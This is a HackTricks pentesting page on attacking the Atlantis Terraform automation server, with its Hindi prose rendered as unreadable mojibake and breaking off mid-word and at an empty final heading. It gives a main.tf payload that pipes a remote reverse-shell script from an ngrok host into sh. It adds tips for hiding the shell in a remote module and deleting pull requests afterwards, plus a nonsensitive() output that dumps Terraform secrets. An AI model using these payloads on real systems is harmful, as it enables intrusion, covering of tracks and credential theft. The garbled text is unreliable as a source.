# Atlantis Security

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

Atlantis рдореВрд▓ рд░реВрдк рд╕реЗ рдЖрдкрдХреЛ рдЕрдкрдиреЗ git рд╕рд░реНрд╡рд░ рд╕реЗ Pull Requests рд╕реЗ terraform рдЪрд▓рд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

![](<../.gitbook/assets/image (51).png>)

## рд╕реНрдерд╛рдиреАрдп рд▓реИрдм

1. [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) рдкрд░ **atlantis releases рдкреЗрдЬ** рдкрд░ рдЬрд╛рдПрдВ рдФрд░ рдЖрдкрдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╡рд╛рд▓рд╛ **рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░реЗрдВред
2. рдЕрдкрдиреЗ **github** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ **personal token** (repo access рдХреЗ рд╕рд╛рде) рдмрдирд╛рдПрдВред
3. `./atlantis testdrive` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рдФрд░ рдпрд╣ рдПрдХ **demo repo** рдмрдирд╛рдПрдЧрд╛ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдк **atlantis рд╕реЗ рдмрд╛рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
4. рдЖрдк рд╡реЗрдм рдкреЗрдЬ рдХреЛ 127.0.0.1:4141 рдкрд░ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## Atlantis рдкрд╣реБрдВрдЪ

### Git рд╕рд░реНрд╡рд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕

**Atlantis** рдХрдИ git рд╣реЛрд╕реНрдЯреНрд╕ рдЬреИрд╕реЗ **Github**, **Gitlab**, **Bitbucket** рдФрд░ **Azure DevOps** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрди рдкреНрд▓реЗрдЯрдлреЙрд░реНрдореНрд╕ рдкрд░ repos рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдФрд░ рдХреНрд░рд┐рдпрд╛рдПрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЗрд╕реЗ рдХреБрдЫ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдкрд╣реБрдВрдЪ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ (рдХрдо рд╕реЗ рдХрдо рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдВ)ред\
[**рдбреЙрдХреНрд╕**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) Atlantis рдХреЗ рд▓рд┐рдП рдЗрди рдкреНрд▓реЗрдЯрдлреЙрд░реНрдореНрд╕ рдкрд░ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдиреЗ рдХреА рд╕рд▓рд╛рд╣ рджреЗрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдХреБрдЫ рд▓реЛрдЧ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЦрд╛рддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="warning" %}
рдХрд┐рд╕реА рднреА рдорд╛рдорд▓реЗ рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, **Atlantis рдЦрд╛рддрд╛** рдПрдХ рдмрд╣реБрдд рд╣реА **рд░реЛрдЪрдХ** рд╣реЛрдЧрд╛ **рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**ред
{% endhint %}

### Webhooks

Atlantis рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ [**Webhook рд╕реАрдХреНрд░реЗрдЯреНрд╕**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░ рд╕рдХреЗ рдХрд┐ рдЙрд╕рдХреЗ Git рд╣реЛрд╕реНрдЯ рд╕реЗ рдкреНрд░рд╛рдкреНрдд **webhooks** **рд╡реИрдз** рд╣реИрдВред

рдЗрд╕рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдХреЗрд╡рд▓ рдЖрдкрдХреЗ Git рд╣реЛрд╕реНрдЯ рдХреЗ IPs рд╕реЗ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ **allowlist** рдХрд░реЗрдВ рд▓реЗрдХрд┐рди рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ Webhook Secret рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЬрдм рддрдХ рдЖрдк рдПрдХ рдирд┐рдЬреА github рдпрд╛ bitbucket рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддреЗ, рдЖрдкрдХреЛ рдЗрдВрдЯрд░рдиреЗрдЯ рдХреЗ рд▓рд┐рдП webhook endpoints рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

{% hint style="warning" %}
Atlantis **webhooks рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛** рд╣реИ рддрд╛рдХрд┐ git рд╕рд░реНрд╡рд░ рдЗрд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬ рд╕рдХреЗред рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ рдпрд╣ рдЬрд╛рдирдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрдЧрд╛ рдХрд┐ **рдХреНрдпрд╛ рдЖрдк рдЗрд╕реЗ рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

### рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ <a href="#provider-credentials" id="provider-credentials"></a>

[рдбреЙрдХреНрд╕ рд╕реЗ:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis рд╕рд░реНрд╡рд░ рдкрд░ **`terraform plan` рдФрд░ `apply`** рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рд╕рд╛рдзрд╛рд░рдг рд░реВрдк рд╕реЗ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ** Terraform рдЪрд▓рд╛рддрд╛ рд╣реИ **рдЬрд┐рд╕ рдкрд░ Atlantis рд╣реЛрд╕реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**ред рдЬреИрд╕реЗ рдЬрдм рдЖрдк Terraform рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЪрд▓рд╛рддреЗ рд╣реИрдВ, Atlantis рдХреЛ рдЖрдкрдХреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдпрд╣ рдЖрдкрдХреЗ рдКрдкрд░ рд╣реИ рдХрд┐ рдЖрдк рдЕрдкрдиреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреЗ рд▓рд┐рдП Atlantis рдХреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреИрд╕реЗ [рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info):

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) рдФрд░ [AWS Fargate Module](https://www.runatlantis.io/docs/deployment.html#aws-fargate) рдХреЗ рдЕрдкрдиреЗ рдореИрдХреЗрдирд┐рдЬреНрдо рд╣реИрдВ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд▓рд┐рдПред рдЙрдирдХреЗ рдбреЙрдХреНрд╕ рдкрдврд╝реЗрдВред
* рдпрджрд┐ рдЖрдк Atlantis рдХреЛ рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдЪрд▓рд╛ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдХрдИ рдХреНрд▓рд╛рдЙрдбреНрд╕ рдХреЗ рдкрд╛рд╕ рдЙрди рдкрд░ рдЪрд▓ рд░рд╣реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЛ рдХреНрд▓рд╛рдЙрдб API рдкрд╣реБрдВрдЪ рджреЗрдиреЗ рдХреЗ рддрд░реАрдХреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
* [AWS EC2 Roles](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Search for "EC2 Role")
* [GCE Instance Service Accounts](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* рдХрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `AWS_ACCESS_KEY`, рдЬрд╣рд╛рдВ Atlantis рдЪрд▓ рд░рд╣рд╛ рд╣реИред
* рдЕрдиреНрдп рдЖрд╡рд╢реНрдпрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `~/.aws/credentials`, рдЬрд╣рд╛рдВ Atlantis рдЪрд▓ рд░рд╣рд╛ рд╣реИред
* [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред

{% hint style="warning" %}
**рдХрдВрдЯреЗрдирд░** рдЬрд╣рд╛рдВ **Atlantis** **рдЪрд▓ рд░рд╣рд╛ рд╣реИ** рдЙрд╕рдореЗрдВ рдЙрдЪреНрдЪ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рд╣реЛрдВрдЧреЗ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░реНрд╕ (AWS, GCP, Github...) рдХреЗ рд▓рд┐рдП рдЬрд┐рдиреНрд╣реЗрдВ Atlantis Terraform рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИред
{% endhint %}

### рд╡реЗрдм рдкреЗрдЬ

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ Atlantis рдПрдХ **рд╡реЗрдм рдкреЗрдЬ рдЪрд▓рд╛рдПрдЧрд╛ рдкреЛрд░реНрдЯ 4141 рдкрд░ localhost рдореЗрдВ**ред рдпрд╣ рдкреЗрдЬ рдХреЗрд╡рд▓ рдЖрдкрдХреЛ atlantis apply рдХреЛ рд╕рдХреНрд╖рдо/рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдФрд░ repos рдХреА рдкреНрд▓рд╛рди рд╕реНрдерд┐рддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЕрдирд▓реЙрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдпрд╣ рдЪреАрдЬреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЙрддрдирд╛ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ)ред

рдЖрдкрдХреЛ рд╢рд╛рдпрдж рдЗрд╕реЗ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЙрдЬрд╛рдЧрд░ рдирд╣реАрдВ рдорд┐рд▓реЗрдЧрд╛, рд▓реЗрдХрд┐рди рдпрд╣ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **рдХреЛрдИ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ** рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдФрд░ рдпрджрд┐ рд╡реЗ рд╣реИрдВ рддреЛ `atlantis`:`atlantis` **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд╡рд╛рд▓реЗ рд╣реИрдВ)ред

## рд╕рд░реНрд╡рд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди

`atlantis server` рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдлреНрд▓реИрдЧреНрд╕, рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░, рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рддреАрдиреЛрдВ рдХреЗ рдорд┐рд╢реНрд░рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

* рдЖрдк [**рдпрд╣рд╛рдВ рдлреНрд▓реИрдЧреНрд╕ рдХреА рд╕реВрдЪреА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) рдЬрд┐рд╕рдХрд╛ рд╕рдорд░реНрдерди Atlantis рд╕рд░реНрд╡рд░ рдХрд░рддрд╛ рд╣реИ
* рдЖрдк [**рдпрд╣рд╛рдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧ рд╡рд┐рдХрд▓реНрдк рдХреЛ рдПрдХ env var рдореЗрдВ рдмрджрд▓реЗрдВ**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

рдорд╛рди **рдЗрд╕ рдХреНрд░рдо рдореЗрдВ рдЪреБрдиреЗ рдЬрд╛рддреЗ рд╣реИрдВ**:

1. рдлреНрд▓реИрдЧреНрд╕
2. рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░
3. рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рдЖрдкрдХреЛ **рдЯреЛрдХрди рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб** рдЬреИрд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рдорд╛рди рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

### Repos рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди

рдХреБрдЫ рдХреЙрдиреНрдлрд╝рд┐

```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```

#### Conftest рдиреАрддрд┐ рдЬрд╛рдБрдЪ

Atlantis **server-side** [**conftest**](https://www.conftest.dev/) **рдиреАрддрд┐рдпреЛрдВ** рдХреЛ рдпреЛрдЬрдирд╛ рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рдЪрд▓рд╛рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдЪрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдЖрдо рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* рдореЙрдбреНрдпреВрд▓ рдХреА рдПрдХ рд╕реВрдЪреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдирдХрд╛рд░рдирд╛
* рд╕рдВрд╕рд╛рдзрди рдХреЗ рдирд┐рд░реНрдорд╛рдг рд╕рдордп рдкрд░ рдЧреБрдгреЛрдВ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдирд╛
* рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рд╕рдВрд╕рд╛рдзрди рд╣рдЯрд╛рдиреЗ рдХреЛ рдкрдХрдбрд╝рдирд╛
* рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рд░реЛрдХрдирд╛ (рдЙрджрд╛. рд╕реБрд░рдХреНрд╖рд┐рдд рдкреЛрд░реНрдЯреНрд╕ рдХреЛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЙрдЬрд╛рдЧрд░ рдХрд░рдирд╛)

рдЖрдк рдЗрд╕реЗ рдХреИрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рдХреА рдЬрд╛рдБрдЪ [**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works) рдореЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## Atlantis рдЖрджреЗрд╢

[**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) рдЖрдк Atlantis рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЬреЛ рд╡рд┐рдХрд▓реНрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```

## рд╣рдорд▓реЗ

{% hint style="warning" %}
рдпрджрд┐ рдЖрдкрдХреЛ рд╢реЛрд╖рдг рдХреЗ рджреМрд░рд╛рди рдпрд╣ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓рддреА рд╣реИ: `Error: Error acquiring the state lock`

рдЖрдк рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд▓рд╛рдХрд░ рдареАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - рдирдП PR рдореЗрдВ Config рд╕рдВрд╢реЛрдзрди

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА repository рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕ рдкрд░ рдПрдХ рдирдИ branch рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ PR рдЬрдирд░реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдк **`atlantis plan` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдпрд╛ рд╢рд╛рдпрдж рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ) **рддреЛ рдЖрдк Atlantis server рдХреЗ рдЕрдВрджрд░ RCE рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдВрдЧреЗ**ред

рдЖрдк рдпрд╣ [**Atlantis рдХреЛ рдПрдХ рдмрд╛рд╣рд░реА рдбреЗрдЯрд╛ рд╕реНрд░реЛрдд рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) рдХрд╣рдХрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдмрд╕ `main.tf` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕рд╛ payload рдбрд╛рд▓реЗрдВ:

```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```

#### рдЕрдзрд┐рдХ рдЧреБрдкреНрдд рд╣рдорд▓рд╛

рдЖрдк рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдФрд░ рднреА **рдЧреБрдкреНрдд рддрд░реАрдХреЗ рд╕реЗ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрди рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ:

* terraform рдлрд╛рдЗрд▓ рдореЗрдВ рд╕реАрдзреЗ rev shell рдЬреЛрдбрд╝рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рдЖрдк рдПрдХ **рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕рдореЗрдВ rev shell рд╣реЛ:

```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```

рдЖрдк рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдХреЛрдб [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

* рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рдореЗрдВ, **ref** рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░реЗрдкреЛ рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╢рд╛рдЦрд╛ рдореЗрдВ **terraform rev shell code рдХреЛ рдЫрд┐рдкрд╛рдПрдВ**, рдЬреИрд╕реЗ: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* рдорд╛рд╕реНрдЯрд░ рдореЗрдВ PR рдмрдирд╛рдиреЗ рдХреЗ **рдмрдЬрд╛рдп**, Atlantis рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **2 рд╢рд╛рдЦрд╛рдПрдВ рдмрдирд╛рдПрдВ** (test1 рдФрд░ test2) рдФрд░ рдПрдХ рд╕реЗ рджреВрд╕рд░реЗ рдореЗрдВ PR рдмрдирд╛рдПрдВред рд╣рдорд▓рд╛ рдкреВрд░рд╛ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдмрд╕ PR рдФрд░ рд╢рд╛рдЦрд╛рдУрдВ рдХреЛ **рд╣рдЯрд╛ рджреЗрдВ**ред

### Atlantis plan Secrets Dump

рдЖрдк terraform рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ **dump** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ `atlantis plan` (`terraform plan`) рдЪрд▓рд╛рдХрд░, terraform рдлрд╛рдЗрд▓ рдореЗрдВ рдЗрд╕ рддрд░рд╣ рдХреБрдЫ рдбрд╛рд▓рдХрд░:

```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```

### Atlantis apply RCE - рдирдП PR рдореЗрдВ Config рд╕рдВрд╢реЛрдзрди

